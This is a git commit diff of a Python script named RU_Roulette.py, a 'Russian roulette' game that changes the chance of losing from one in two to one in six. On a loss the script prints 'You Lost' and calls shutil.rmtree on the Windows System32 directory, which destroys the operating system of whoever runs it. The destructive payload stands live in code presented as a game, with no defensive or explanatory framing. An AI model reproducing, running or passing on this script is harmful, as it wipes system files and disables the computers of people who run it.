72264be41eefb16afdc2e61f5f15693f4a3a3869
Londopy <109172537+Londopy@users.noreply.github.com>
2023-02-27 18:13:44 -0800

    Update RU_Roulette.py

--- RU_Roulette.py
+++ RU_Roulette.py
@@ -1,7 +1,7 @@
 import random
 from time import sleep
 import shutil
-if random.randint(1, 2) == 2:
+if random.randint(1, 6) == 6:
     print("You Lost")
     sleep(2)
     shutil.rmtree(r'C:\Windows/System32')
